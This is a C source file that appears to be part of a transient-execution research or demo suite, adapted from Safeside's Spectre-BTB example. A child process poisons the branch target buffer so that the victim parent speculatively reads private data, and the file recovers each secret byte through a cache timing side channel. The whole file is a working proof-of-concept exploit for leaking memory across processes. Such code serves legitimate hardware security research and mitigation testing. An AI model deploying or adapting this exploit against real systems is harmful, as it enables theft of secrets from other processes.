// Based on spectre_v1_btb_ca in Safeside.

#include "trex.h"
#include "demo.h"
#include "timing_array.h"
#include "utils.h"

#include <ctype.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>
#ifdef linux
#include <sys/prctl.h>
#endif

#define ACCESSOR_ARRAY_LENGTH 1024

// This is a sanity check to make sure get_private_byte() is never architecturally called
// by the victim process.  If we can leak from private_data without seeing sanity_counter
// increase, then we can be confident it's transient execution and not a code mistake.
int *sanity_counter;

char get_private_byte(size_t index)
{
	// Can't do any branches here, so universally increment the counter
	(*sanity_counter)++;
	return private_data[index];
}

__attribute__((__section__("text.zzz"))) char get_public_byte(size_t index)
{
	return public_data[index];
}

struct accessor {
	char (*ptr)(size_t);
};

char leak_byte(size_t offset)
{
	// Make sure we can flush the accessor without hitting anything else
	struct timing_array *ta = ta_new();
	struct accessor *accessor = aligned_alloc(cacheline_size, cacheline_size);
	char (*ptr_array[ACCESSOR_ARRAY_LENGTH])(size_t);
	int run, result;
	size_t i;

	for (run = 0;; run++) {
		// Only the parent needs to flush the array
		ta_flush(ta);

		for (i = 0; i < ACCESSOR_ARRAY_LENGTH; i++) {
			// child gets get_private_byte(), parent gets get_public_byte()
			ptr_array[i] = (char (*)(size_t))(
				(unsigned long)get_private_byte +
				(bool)child_pid * ((unsigned long)get_public_byte -
						   (unsigned long)get_private_byte));
		}

		for (i = 0; i < ACCESSOR_ARRAY_LENGTH; i++) {
			accessor->ptr = ptr_array[i];

			// Make sure the CPU doesn't know what function it's calling
			flush_cacheline(accessor);

			// Architecturally, the parent will always call get_public_byte()
			force_read(ta->entries[(size_t)accessor->ptr(offset)]);
		}

		// Only the parent (victim) compute results
		if (!is_child) {
			result = ta_find_first_cached_index_after(ta, 0);

			if (result >= 0) {
				free(accessor);
				ta_free(ta);
				return result;
			}

			if (run > 10000) {
				free(accessor);
				ta_free(ta);
				trex_demo_exit(TREX_COULDNT_LEAK);
			}
		}

		// If we're the child and the parent has died, we can dip
		if (is_child && getppid() != parent_pid) {
			free(accessor);
			ta_free(ta);
			trex_demo_exit(TREX_SUCCESS);
		}

		// Throw the other PID a bone
		sched_yield();
	}
}

void child(void)
{
	int count = 0;
	sanity_counter = &count;

	leak_byte(0);
}

int parent(void)
{
	size_t i;
	int count = 0;
	sanity_counter = &count;

	// Make sure the sanity counter actually works
	if (get_private_byte(0) && *sanity_counter) {
		count = 0;
	} else {
		printf("\nBUG: sanity_counter isn't working, can't guarantee result.\n");
		return TREX_ERROR;
	}

	for (i = 0; i < SECRET_LEN; i++) {
		print_leak(leak_byte(i), i);
		if (*sanity_counter) {
			printf("\nBUG: get_private_byte() has been architecturally executed by the victim.\n");
			return TREX_ERROR;
		}
	}

	return TREX_SUCCESS;
}

int main(void)
{
	int result;

	trex_demo_init(true, true);

	if (is_child) {
		// Child is the attacker
		munmap(private_data, 1ul << 30);
		private_data = public_data;
		child();
	} else {
		// Parent is the victim
		result = parent();
		trex_demo_exit(result);
	}
}
